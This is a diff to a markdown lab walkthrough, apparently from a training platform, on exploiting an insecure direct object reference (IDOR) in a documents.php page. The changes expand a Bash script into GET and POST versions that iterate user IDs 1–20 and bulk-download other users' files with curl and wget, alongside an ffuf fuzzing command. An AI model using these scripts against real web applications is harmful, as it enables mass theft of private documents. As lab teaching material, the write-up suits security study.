@@ -366,7 +366,7 @@ When navigating to the `Documents` section, we are redirected to:
 http://94.237.57.211:47065/documents.php
 ```
 
-![Filtered output](images/idor2.png)
+![Filtered output](images/idor2.PNG)
 
 On the `Documents` page, several files belonging to our user are listed:
 
@@ -413,18 +413,36 @@ ffuf -w ids.txt:FUZZ -u http://94.237.57.211:47065/documents.php?uid=FUZZ
 
 A more effective approach is to automate both enumeration and file retrieval using a simple `Bash` script:
 
+`GET`-based version IDOR enumeration script:
+
 ```bash
 #!/bin/bash
 
-url="http://94.237.57.211:47065"
+url="http://SERVER_IP:PORT"
+ext="pdf|txt|doc|docx|xls|xlsx|csv|zip"
 
-for i in {1..10}; do
-        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
-                wget -q $url/$link
-        done
+for i in {1..20}; do
+    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oiE "/documents[^\"' ]*\.($ext)" | sort -u); do
+        wget -q "$url/$link"
+    done
 done
 ```
 
-When executed, this script iterates through user IDs 1–10, extracts document links, and downloads all available files. This results in **mass disclosure of sensitive employee documents**, fully exploiting the IDOR vulnerability.
+`POST`-based IDOR enumeration script:
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+ext="pdf|txt|doc|docx|xls|xlsx|csv|zip"
+
+for i in {1..20}; do
+    for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oiE "/documents[^\"' ]*\.($ext)" | sort -u); do
+        wget -q "$url/$link"
+    done
+done
+
+```
+
+When executed, this script iterates through user IDs 1–20, extracts document links, and downloads all available files. This results in **mass disclosure of sensitive employee documents**, fully exploiting the IDOR vulnerability.
 
 ---
